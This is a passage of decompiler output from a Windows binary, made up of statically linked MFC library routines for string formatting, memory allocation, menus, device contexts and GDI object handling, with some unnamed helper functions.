      param_2 = (wchar_t *)((int)param_2 + 1);
    }
    wVar1 = *pwVar3;
  }
  pwVar3 = (wchar_t *)
           ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT<char,0> *)param_1,(int)param_2)
  ;
  wVar1 = *pwVar5;
  do {
    if (wVar1 == L'\0') {
      ATL::CSimpleStringT<wchar_t,0>::ReleaseBuffer
                ((CSimpleStringT<wchar_t,0> *)param_1,(int)pwVar3 - *(int *)param_1 >> 1);
      return;
    }
    if (*pwVar5 == L'%') {
      wVar1 = pwVar5[1];
      if (((ushort)wVar1 < 0x31) || (0x39 < (ushort)wVar1)) {
        if (((ushort)wVar1 < 0x41) || (0x5a < (ushort)wVar1)) goto LAB_00412f58;
        if ((ushort)wVar1 < 0x3a) goto LAB_00412f0d;
        iVar2 = (ushort)wVar1 - 0x38;
      }
      else {
LAB_00412f0d:
        iVar2 = (ushort)wVar1 - 0x31;
      }
      pwVar5 = pwVar5 + 2;
      if (param_4 <= iVar2) {
        *pwVar3 = L'?';
        goto LAB_00412f5f;
      }
      lpString = param_3[iVar2];
      if (lpString != (LPCWSTR)0x0) {
        iVar4 = lstrlenW(lpString);
        ATL::Checked::tcscpy_s(pwVar3,(int)param_2 + 1,param_3[iVar2]);
        param_2 = (wchar_t *)((int)param_2 - iVar4);
        pwVar3 = pwVar3 + iVar4;
      }
    }
    else {
LAB_00412f58:
      *pwVar3 = *pwVar5;
      pwVar5 = pwVar5 + 1;
LAB_00412f5f:
      pwVar3 = pwVar3 + 1;
      param_2 = (wchar_t *)((int)param_2 + -1);
    }
    wVar1 = *pwVar5;
  } while( true );
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void __stdcall AfxFormatStrings(class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > > &,unsigned int,wchar_t const * const *,int)
// 
// Library: Visual Studio 2008 Release

void AfxFormatStrings(CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>
                      *param_1,uint param_2,wchar_t **param_3,int param_4)

{
  int iVar1;
  wchar_t *local_14 [3];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 4;
  local_8 = 0x412f8c;
  FUN_0040b274(local_14);
  local_8 = 0;
  iVar1 = ATL::CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>::
          LoadStringW((CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>
                       *)local_14,param_2);
  if (iVar1 != 0) {
    AfxFormatStrings(param_1,local_14[0],param_3,param_4);
  }
  FUN_0040ae6f((int **)(local_14[0] + -8));
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  void __stdcall AfxFormatString1(class ATL::CStringT<char,class StrTraitMFC<char,class
// ATL::ChTraitsCRT<char> > > &,unsigned int,char const *)
//  void __stdcall AfxFormatString1(class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > > &,unsigned int,wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void AfxFormatString1(CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>
                      *param_1,uint param_2)

{
  AfxFormatStrings(param_1,param_2,(wchar_t **)&stack0x0000000c,1);
  return;
}



// Library Function - Single Match
//  public: __thiscall CFixedAllocNoSync::CFixedAllocNoSync(unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

void __thiscall
CFixedAllocNoSync::CFixedAllocNoSync(CFixedAllocNoSync *this,uint param_1,uint param_2)

{
  if (param_1 < 4) {
    param_1 = 4;
  }
  if (param_2 < 2) {
    param_2 = 0x40;
  }
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 8) = 0;
  *(uint *)this = param_1;
  *(uint *)(this + 4) = param_2;
  return;
}



// Library Function - Single Match
//  public: void __thiscall CFixedAllocNoSync::FreeAll(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CFixedAllocNoSync::FreeAll(CFixedAllocNoSync *this)

{
  CPlex::FreeDataChain(*(CPlex **)(this + 8));
  *(undefined4 *)(this + 8) = 0;
  *(undefined4 *)(this + 0xc) = 0;
  return;
}



void __fastcall FUN_00413030(int param_1)

{
  CPlex::FreeDataChain(*(CPlex **)(param_1 + 8));
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  return;
}



// Library Function - Single Match
//  public: void * __thiscall CFixedAllocNoSync::Alloc(void)
// 
// Library: Visual Studio 2008 Release

void * __thiscall CFixedAllocNoSync::Alloc(CFixedAllocNoSync *this)

{
  CPlex *pCVar1;
  undefined4 *puVar2;
  int iVar3;
  
  if (*(int *)(this + 0xc) == 0) {
    pCVar1 = CPlex::Create((CPlex **)(this + 8),*(uint *)(this + 4),*(uint *)this);
    iVar3 = *(int *)(this + 4) + -1;
    puVar2 = (undefined4 *)(pCVar1 + *(int *)this * iVar3 + 4);
    for (; -1 < iVar3; iVar3 = iVar3 + -1) {
      *puVar2 = *(undefined4 *)(this + 0xc);
      *(undefined4 **)(this + 0xc) = puVar2;
      puVar2 = (undefined4 *)((int)puVar2 - *(int *)this);
    }
  }
  puVar2 = *(undefined4 **)(this + 0xc);
  *(undefined4 *)(this + 0xc) = *puVar2;
  return puVar2;
}



void FUN_00413077(void)

{
  return;
}



undefined ** FUN_0041307a(void)

{
  return &PTR_s_CMenu_0042aa00;
}



void FUN_00413080(int *param_1)

{
  (**(code **)(*param_1 + 4))(0);
  return;
}



void FUN_004130ad(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    param_1[1] = 0;
    *param_1 = CMenu::vftable;
  }
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  class CHandleMap * __stdcall afxMapHMENU(int)
// 
// Library: Visual Studio 2008 Release

CHandleMap * afxMapHMENU(int param_1)

{
  AFX_MODULE_THREAD_STATE *pAVar1;
  _func_int_uint *p_Var2;
  CHandleMap *this;
  undefined4 uVar3;
  
  pAVar1 = AfxGetModuleThreadState();
  if ((*(int *)(pAVar1 + 0x18) == 0) && (param_1 != 0)) {
    p_Var2 = AfxSetNewHandler(AfxCriticalNewHandler);
    this = (CHandleMap *)operator_new(0x60);
    if (this == (CHandleMap *)0x0) {
      uVar3 = 0;
    }
    else {
      uVar3 = CHandleMap::CHandleMap
                        (this,(CRuntimeClass *)&PTR_s_CMenu_0042aa00,FUN_004130ad,FUN_00413080,4,1);
    }
    *(undefined4 *)(pAVar1 + 0x18) = uVar3;
    AfxSetNewHandler(p_Var2);
  }
  return *(CHandleMap **)(pAVar1 + 0x18);
}



// Library Function - Single Match
//  public: static class CMenu * __stdcall CMenu::FromHandle(struct HMENU__ *)
// 
// Library: Visual Studio 2008 Release

CMenu * CMenu::FromHandle(HMENU__ *param_1)

{
  CHandleMap *this;
  CObject *pCVar1;
  
  this = afxMapHMENU(1);
  pCVar1 = CHandleMap::FromHandle(this,param_1);
  return (CMenu *)pCVar1;
}



// Library Function - Single Match
//  public: static class CMenu * __stdcall CMenu::FromHandlePermanent(struct HMENU__ *)
// 
// Library: Visual Studio 2008 Release

CMenu * CMenu::FromHandlePermanent(HMENU__ *param_1)

{
  CHandleMap *pCVar1;
  CMenu *pCVar2;
  
  pCVar1 = afxMapHMENU(0);
  if (pCVar1 != (CHandleMap *)0x0) {
    pCVar2 = (CMenu *)CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(pCVar1 + 0x1c),param_1);
    return pCVar2;
  }
  return (CMenu *)0x0;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void * __thiscall CGdiObject::Detach(void)
//  public: struct HMENU__ * __thiscall CMenu::Detach(void)
// 
// Library: Visual Studio 2008 Release

int __fastcall Detach(int param_1)

{
  int iVar1;
  CHandleMap *pCVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if (iVar1 != 0) {
    pCVar2 = afxMapHMENU(0);
    if (pCVar2 != (CHandleMap *)0x0) {
      CMapPtrToPtr::RemoveKey((CMapPtrToPtr *)(pCVar2 + 0x1c),*(void **)(param_1 + 4));
    }
  }
  *(undefined4 *)(param_1 + 4) = 0;
  return iVar1;
}



// Library Function - Single Match
//  public: int __thiscall CMenu::DestroyMenu(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

int __thiscall CMenu::DestroyMenu(CMenu *this)

{
  HMENU hMenu;
  BOOL BVar1;
  
  if (*(int *)(this + 4) == 0) {
    return 0;
  }
  hMenu = (HMENU)Detach((int)this);
  BVar1 = ::DestroyMenu(hMenu);
  return BVar1;
}



// Library Function - Single Match
//  public: virtual void * __thiscall CMenu::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall CMenu::_scalar_deleting_destructor_(CMenu *this,uint param_1)

{
  *(undefined ***)this = vftable;
  DestroyMenu(this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return this;
}



// WARNING: Function: __EH_prolog3_catch_GS replaced with injection: EH_prolog3
// Library Function - Single Match
//  public: virtual __thiscall CImageList::~CImageList(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void __thiscall CImageList::~CImageList(CImageList *this)

{
  *(undefined ***)this = CGdiObject::vftable;
  CGdiObject::DeleteObject((CGdiObject *)this);
  FUN_0041696b();
  return;
}



undefined4 Catch_004131fd(void)

{
  int *piVar1;
  wchar_t *pwVar2;
  int iVar3;
  int unaff_EBP;
  
  FUN_0040b274((void *)(unaff_EBP + -0x418));
  piVar1 = *(int **)(unaff_EBP + -0x41c);
  iVar3 = *piVar1;
  *(undefined *)(unaff_EBP + -4) = 2;
  iVar3 = (**(code **)(iVar3 + 0xc))(unaff_EBP + -0x414,0x200,0);
  if (iVar3 == 0) {
    Format((void *)(unaff_EBP + -0x418),L"%s (%s:%d)");
  }
  else {
    Format((void *)(unaff_EBP + -0x418),L"%s (%s:%d)\n%s");
  }
  pwVar2 = *(wchar_t **)(unaff_EBP + -0x418);
  AfxMessageBox(pwVar2,0,0);
  *(undefined *)(unaff_EBP + -4) = 1;
  FUN_0040ae6f((int **)(pwVar2 + -8));
  (**(code **)(*piVar1 + 4))(1);
  return 0x4131f7;
}



// Library Function - Single Match
//  public: virtual void * __thiscall CImageList::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall CImageList::_scalar_deleting_destructor_(CImageList *this,uint param_1)

{
  ~CImageList(this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return this;
}



void __thiscall FUN_004132bf(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 8) = param_1;
  return;
}



void __thiscall FUN_004132ce(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 4) = param_1;
  return;
}



void __fastcall FUN_004132dd(int param_1)

{
  *(undefined4 *)(param_1 + 8) = 0;
  return;
}



void __fastcall FUN_004132e2(int param_1)

{
  *(undefined4 *)(param_1 + 4) = 0;
  return;
}



// Library Function - Single Match
//  public: virtual int __thiscall CDC::SaveDC(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __thiscall CDC::SaveDC(CDC *this)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  if (*(HDC *)(this + 8) != (HDC)0x0) {
    iVar2 = ::SaveDC(*(HDC *)(this + 8));
  }
  if (*(HDC *)(this + 4) != *(HDC *)(this + 8)) {
    iVar1 = ::SaveDC(*(HDC *)(this + 4));
    if (iVar1 != 0) {
      iVar2 = -1;
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  public: virtual int __thiscall CDC::RestoreDC(int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __thiscall CDC::RestoreDC(CDC *this,int param_1)

{
  int iVar1;
  BOOL BVar2;
  
  iVar1 = 1;
  if (*(HDC *)(this + 4) != *(HDC *)(this + 8)) {
    iVar1 = ::RestoreDC(*(HDC *)(this + 4),param_1);
  }
  if (*(HDC *)(this + 8) != (HDC)0x0) {
    if ((iVar1 != 0) && (BVar2 = ::RestoreDC(*(HDC *)(this + 8),param_1), BVar2 != 0)) {
      return 1;
    }
    iVar1 = 0;
  }
  return iVar1;
}



COLORREF __thiscall FUN_0041335c(void *this,COLORREF param_1)

{
  COLORREF CVar1;
  
  CVar1 = 0xffffffff;
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    CVar1 = SetBkColor(*(HDC *)((int)this + 4),param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    CVar1 = SetBkColor(*(HDC *)((int)this + 8),param_1);
  }
  return CVar1;
}



COLORREF __thiscall FUN_0041338f(void *this,COLORREF param_1)

{
  COLORREF CVar1;
  
  CVar1 = 0xffffffff;
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    CVar1 = SetTextColor(*(HDC *)((int)this + 4),param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    CVar1 = SetTextColor(*(HDC *)((int)this + 8),param_1);
  }
  return CVar1;
}



int __thiscall FUN_004133c2(void *this,int param_1)

{
  int iVar1;
  
  iVar1 = 0;
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    iVar1 = SetMapMode(*(HDC *)((int)this + 4),param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    iVar1 = SetMapMode(*(HDC *)((int)this + 8),param_1);
  }
  return iVar1;
}



void __thiscall FUN_004133f4(void *this,LPRECT param_1)

{
  GetClipBox(*(HDC *)((int)this + 4),param_1);
  return;
}



undefined ** FUN_00413409(void)

{
  return &PTR_s_CResourceException_0042aae8;
}



undefined ** FUN_0041340f(void)

{
  return &PTR_s_CUserException_0042ab04;
}



undefined ** FUN_00413415(void)

{
  return &PTR_PTR_DAT_0042ab20;
}



undefined ** FUN_0041341b(void)

{
  return &PTR_s_CGdiObject_0042ab3c;
}



void __fastcall FUN_00413421(undefined4 *param_1)

{
  *param_1 = CDC::vftable;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  return;
}



void __thiscall FUN_00413435(void *this,int param_1,int param_2)

{
  PtVisible(*(HDC *)((int)this + 4),param_1,param_2);
  return;
}



void __thiscall FUN_0041344d(void *this,RECT *param_1)

{
  RectVisible(*(HDC *)((int)this + 4),param_1);
  return;
}



void __thiscall FUN_00413462(void *this,int param_1,int param_2,LPCWSTR param_3,int param_4)

{
  TextOutW(*(HDC *)((int)this + 4),param_1,param_2,param_3,param_4);
  return;
}



void __thiscall
FUN_00413480(void *this,int param_1,int param_2,UINT param_3,RECT *param_4,LPCWSTR param_5,
            UINT param_6,INT *param_7)

{
  ExtTextOutW(*(HDC *)((int)this + 4),param_1,param_2,param_3,param_4,param_5,param_6,param_7);
  return;
}



int * __thiscall
FUN_004134a7(void *this,int *param_1,int param_2,int param_3,LPCWSTR param_4,int param_5,int param_6
            ,INT *param_7,int param_8)

{
  LONG LVar1;
  
  LVar1 = TabbedTextOutW(*(HDC *)((int)this + 4),param_2,param_3,param_4,param_5,param_6,param_7,
                         param_8);
  param_1[1] = (int)(short)((uint)LVar1 >> 0x10);
  *param_1 = (int)(short)LVar1;
  return param_1;
}



void __thiscall FUN_004134df(void *this,LPCWSTR param_1,int param_2,LPRECT param_3,UINT param_4)

{
  DrawTextW(*(HDC *)((int)this + 4),param_1,param_2,param_3,param_4);
  return;
}



void __thiscall
FUN_004134fd(void *this,LPWSTR param_1,int param_2,LPRECT param_3,UINT param_4,
            LPDRAWTEXTPARAMS param_5)

{
  DrawTextExW(*(HDC *)((int)this + 4),param_1,param_2,param_3,param_4,param_5);
  return;
}



void __thiscall
FUN_0041351e(void *this,HBRUSH param_1,GRAYSTRINGPROC param_2,LPARAM param_3,int param_4,int param_5
            ,int param_6,int param_7,int param_8)

{
  if (param_1 != (HBRUSH)0x0) {
    param_1 = (HBRUSH)param_1[1].unused;
  }
  GrayStringW(*(HDC *)((int)this + 4),param_1,param_2,param_3,param_4,param_5,param_6,param_7,
              param_8);
  return;
}



void __thiscall FUN_00413550(void *this,int param_1,int param_2,LPCSTR param_3,LPVOID param_4)

{
  Escape(*(HDC *)((int)this + 4),param_1,param_2,param_3,param_4);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class CPoint __thiscall CDC::MoveTo(int,int)
//  public: virtual class CPoint __thiscall CDC::OffsetViewportOrg(int,int)
//  public: class CPoint __thiscall CDC::OffsetWindowOrg(int,int)
//  public: virtual class CSize __thiscall CDC::SetViewportExt(int,int)
//   7 names - too many to list
// 
// Library: Visual Studio 2008 Release

LPPOINT __thiscall FID_conflict_OffsetWindowOrg(void *this,LPPOINT param_1,int param_2,int param_3)

{
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    SetViewportOrgEx(*(HDC *)((int)this + 4),param_2,param_3,param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    SetViewportOrgEx(*(HDC *)((int)this + 8),param_2,param_3,param_1);
  }
  return param_1;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class CPoint __thiscall CDC::MoveTo(int,int)
//  public: virtual class CPoint __thiscall CDC::OffsetViewportOrg(int,int)
//  public: class CPoint __thiscall CDC::OffsetWindowOrg(int,int)
//  public: virtual class CSize __thiscall CDC::SetViewportExt(int,int)
//   7 names - too many to list
// 
// Library: Visual Studio 2008 Release

LPPOINT __thiscall FID_conflict_OffsetWindowOrg(void *this,LPPOINT param_1,int param_2,int param_3)

{
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    OffsetViewportOrgEx(*(HDC *)((int)this + 4),param_2,param_3,param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    OffsetViewportOrgEx(*(HDC *)((int)this + 8),param_2,param_3,param_1);
  }
  return param_1;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class CPoint __thiscall CDC::MoveTo(int,int)
//  public: virtual class CPoint __thiscall CDC::OffsetViewportOrg(int,int)
//  public: class CPoint __thiscall CDC::OffsetWindowOrg(int,int)
//  public: virtual class CSize __thiscall CDC::SetViewportExt(int,int)
//   7 names - too many to list
// 
// Library: Visual Studio 2008 Release

LPSIZE __thiscall FID_conflict_OffsetWindowOrg(void *this,LPSIZE param_1,int param_2,int param_3)

{
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    SetViewportExtEx(*(HDC *)((int)this + 4),param_2,param_3,param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    SetViewportExtEx(*(HDC *)((int)this + 8),param_2,param_3,param_1);
  }
  return param_1;
}



// Library Function - Multiple Matches With Different Base Names
//  public: virtual class CSize __thiscall CDC::ScaleViewportExt(int,int,int,int)
//  public: virtual class CSize __thiscall CDC::ScaleWindowExt(int,int,int,int)
// 
// Library: Visual Studio 2008 Release

LPSIZE __thiscall
FID_conflict_ScaleWindowExt
          (void *this,LPSIZE param_1,int param_2,int param_3,int param_4,int param_5)

{
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    ScaleViewportExtEx(*(HDC *)((int)this + 4),param_2,param_3,param_4,param_5,param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    ScaleViewportExtEx(*(HDC *)((int)this + 8),param_2,param_3,param_4,param_5,param_1);
  }
  return param_1;
}



// Library Function - Multiple Matches With Different Base Names
//  public: class CPoint __thiscall CDC::MoveTo(int,int)
//  public: virtual class CPoint __thiscall CDC::OffsetViewportOrg(int,int)
//  public: class CPoint __thiscall CDC::OffsetWindowOrg(int,int)
//  public: virtual class CSize __thiscall CDC::SetViewportExt(int,int)
//   7 names - too many to list
// 
// Library: Visual Studio 2008 Release

LPSIZE __thiscall FID_conflict_OffsetWindowOrg(void *this,LPSIZE param_1,int param_2,int param_3)

{
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    SetWindowExtEx(*(HDC *)((int)this + 4),param_2,param_3,param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    SetWindowExtEx(*(HDC *)((int)this + 8),param_2,param_3,param_1);
  }
  return param_1;
}



// Library Function - Multiple Matches With Different Base Names
//  public: virtual class CSize __thiscall CDC::ScaleViewportExt(int,int,int,int)
//  public: virtual class CSize __thiscall CDC::ScaleWindowExt(int,int,int,int)
// 
// Library: Visual Studio 2008 Release

LPSIZE __thiscall
FID_conflict_ScaleWindowExt
          (void *this,LPSIZE param_1,int param_2,int param_3,int param_4,int param_5)

{
  if (*(HDC *)((int)this + 4) != *(HDC *)((int)this + 8)) {
    ScaleWindowExtEx(*(HDC *)((int)this + 4),param_2,param_3,param_4,param_5,param_1);
  }
  if (*(HDC *)((int)this + 8) != (HDC)0x0) {
    ScaleWindowExtEx(*(HDC *)((int)this + 8),param_2,param_3,param_4,param_5,param_1);
  }
  return param_1;
}



// Library Function - Single Match
//  public: static void __stdcall ConstructDestruct<class CDC>::Construct(class CObject *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void ConstructDestruct<class_CDC>::Construct(CObject *param_1)

{
  if (param_1 != (CObject *)0x0) {
    *(undefined ***)param_1 = CDC::vftable;
    *(undefined4 *)(param_1 + 4) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  return;
}



void FUN_0041375c(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    param_1[1] = 0;
    *param_1 = CGdiObject::vftable;
  }
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  class CHandleMap * __stdcall afxMapHDC(int)
// 
// Library: Visual Studio 2008 Release

CHandleMap * afxMapHDC(int param_1)

{
  AFX_MODULE_THREAD_STATE *pAVar1;
  _func_int_uint *p_Var2;
  CHandleMap *this;
  undefined4 uVar3;
  
  pAVar1 = AfxGetModuleThreadState();
  if ((*(int *)(pAVar1 + 0x1c) == 0) && (param_1 != 0)) {
    p_Var2 = AfxSetNewHandler(AfxCriticalNewHandler);
    this = (CHandleMap *)operator_new(0x60);
    if (this == (CHandleMap *)0x0) {
      uVar3 = 0;
    }
    else {
      uVar3 = CHandleMap::CHandleMap
                        (this,(CRuntimeClass *)&PTR_PTR_DAT_0042ab20,
                         ConstructDestruct<class_CDC>::Construct,FUN_00413080,4,2);
    }
    *(undefined4 *)(pAVar1 + 0x1c) = uVar3;
    AfxSetNewHandler(p_Var2);
  }
  return *(CHandleMap **)(pAVar1 + 0x1c);
}



// Library Function - Multiple Matches With Same Base Name
//  public: static class CDC * __stdcall CDC::FromHandle(struct HDC__ *)
//  public: static class CMenu * __stdcall CMenu::FromHandle(struct HMENU__ *)
// 
// Library: Visual Studio 2008 Release

void FromHandle(void *param_1)

{
  CHandleMap *this;
  
  this = afxMapHDC(1);
  CHandleMap::FromHandle(this,param_1);
  return;
}



// Library Function - Single Match
//  public: struct HDC__ * __thiscall CDC::Detach(void)
// 
// Library: Visual Studio 2008 Release

HDC__ * __thiscall CDC::Detach(CDC *this)

{
  HDC__ *pHVar1;
  CHandleMap *pCVar2;
  
  pHVar1 = *(HDC__ **)(this + 4);
  if (pHVar1 != (HDC__ *)0x0) {
    pCVar2 = afxMapHDC(0);
    if (pCVar2 != (CHandleMap *)0x0) {
      CMapPtrToPtr::RemoveKey((CMapPtrToPtr *)(pCVar2 + 0x1c),*(void **)(this + 4));
    }
  }
  (**(code **)(*(int *)this + 0x14))();
  *(undefined4 *)(this + 4) = 0;
  return pHVar1;
}



// Library Function - Single Match
//  public: virtual __thiscall CDC::~CDC(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CDC::~CDC(CDC *this)

{
  HDC__ *hdc;
  
  *(undefined ***)this = vftable;
  if (*(int *)(this + 4) != 0) {
    hdc = Detach(this);
    DeleteDC(hdc);
  }
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  class CHandleMap * __stdcall afxMapHGDIOBJ(int)
// 
// Library: Visual Studio 2008 Release

CHandleMap * afxMapHGDIOBJ(int param_1)

{
  AFX_MODULE_THREAD_STATE *pAVar1;
  _func_int_uint *p_Var2;
  CHandleMap *this;
  undefined4 uVar3;
  
  pAVar1 = AfxGetModuleThreadState();
  if ((*(int *)(pAVar1 + 0x20) == 0) && (param_1 != 0)) {
    p_Var2 = AfxSetNewHandler(AfxCriticalNewHandler);
    this = (CHandleMap *)operator_new(0x60);
    if (this == (CHandleMap *)0x0) {
      uVar3 = 0;
    }
    else {
      uVar3 = CHandleMap::CHandleMap
                        (this,(CRuntimeClass *)&PTR_s_CGdiObject_0042ab3c,FUN_0041375c,FUN_00413080,
                         4,1);
    }
    *(undefined4 *)(pAVar1 + 0x20) = uVar3;
    AfxSetNewHandler(p_Var2);
  }
  return *(CHandleMap **)(pAVar1 + 0x20);
}



// Library Function - Single Match
//  public: static class CGdiObject * __stdcall CGdiObject::FromHandle(void *)
// 
// Library: Visual Studio 2008 Release

CGdiObject * CGdiObject::FromHandle(void *param_1)

{
  CHandleMap *this;
  CObject *pCVar1;
  
  this = afxMapHGDIOBJ(1);
  pCVar1 = CHandleMap::FromHandle(this,param_1);
  return (CGdiObject *)pCVar1;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void * __thiscall CGdiObject::Detach(void)
//  public: struct HMENU__ * __thiscall CMenu::Detach(void)
// 
// Library: Visual Studio 2008 Release

int __fastcall Detach(int param_1)

{
  int iVar1;
  CHandleMap *pCVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if (iVar1 != 0) {
    pCVar2 = afxMapHGDIOBJ(0);
    if (pCVar2 != (CHandleMap *)0x0) {
      CMapPtrToPtr::RemoveKey((CMapPtrToPtr *)(pCVar2 + 0x1c),*(void **)(param_1 + 4));
    }
  }
  *(undefined4 *)(param_1 + 4) = 0;
  return iVar1;
}



// Library Function - Single Match
//  public: int __thiscall CGdiObject::DeleteObject(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

int __thiscall CGdiObject::DeleteObject(CGdiObject *this)

{
  HGDIOBJ ho;
  BOOL BVar1;
  
  if (*(int *)(this + 4) == 0) {
    return 0;
  }
  ho = (HGDIOBJ)Detach((int)this);
  BVar1 = ::DeleteObject(ho);
  return BVar1;
}



CDC * __thiscall FUN_00413914(void *this,byte param_1)

{
  CDC::~CDC((CDC *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (CDC *)this;
}



// Library Function - Single Match
//  public: virtual class CGdiObject * __thiscall CDC::SelectStockObject(int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

CGdiObject * __thiscall CDC::SelectStockObject(CDC *this,int param_1)

{
  HGDIOBJ h;
  void *pvVar1;
  CGdiObject *pCVar2;
  
  h = GetStockObject(param_1);
  pvVar1 = (HGDIOBJ)0x0;
  if (*(HDC *)(this + 4) != *(HDC *)(this + 8)) {
    pvVar1 = SelectObject(*(HDC *)(this + 4),h);
  }
  if (*(HDC *)(this + 8) != (HDC)0x0) {
    pvVar1 = SelectObject(*(HDC *)(this + 8),h);
  }
  pCVar2 = CGdiObject::FromHandle(pvVar1);
  return pCVar2;
}



// Library Function - Multiple Matches With Same Base Name
//  public: class CBrush * __thiscall CDC::SelectObject(class CBrush *)
//  public: class CPen * __thiscall CDC::SelectObject(class CPen *)
//  public: virtual class CFont * __thiscall CDC::SelectObject(class CFont *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

HGDIOBJ SelectObject(HDC hdc,HGDIOBJ h)

{
  HGDIOBJ pvVar1;
  CGdiObject *pCVar2;
  int in_ECX;
  
  pvVar1 = (HGDIOBJ)0x0;
  if (*(HDC *)(in_ECX + 4) != *(HDC *)(in_ECX + 8)) {
    if (hdc != (HDC)0x0) {
      pvVar1 = (HGDIOBJ)hdc[1].unused;
    }
    pvVar1 = SelectObject(*(HDC *)(in_ECX + 4),pvVar1);
  }
  if (*(HDC *)(in_ECX + 8) != (HDC)0x0) {
    if (hdc == (HDC)0x0) {
      pvVar1 = (HGDIOBJ)0x0;
    }
    else {
      pvVar1 = (HGDIOBJ)hdc[1].unused;
    }
    pvVar1 = SelectObject(*(HDC *)(in_ECX + 8),pvVar1);
  }
  pCVar2 = CGdiObject::FromHandle(pvVar1);
  return pCVar2;
}



// Library Function - Single Match
//  void __stdcall AfxPostQuitMessage(int)
// 
// Library: Visual Studio 2008 Release

void AfxPostQuitMessage(int param_1)

{
  int iVar1;
  
  iVar1 = FUN_0040c560();
  if ((iVar1 != 0) && (*(code **)(iVar1 + 0x3c) != (code *)0x0)) {
    (**(code **)(iVar1 + 0x3c))(1,1);
  }
                    // WARNING: Could not recover jumptable at 0x004139dd. Too many branches
                    // WARNING: Treating indirect jump as call
  PostQuitMessage(param_1);
  return;
}



// Library Function - Single Match
//  public: void __thiscall CWinApp::DevModeChange(wchar_t *)
// 
// Library: Visual Studio 2008 Release

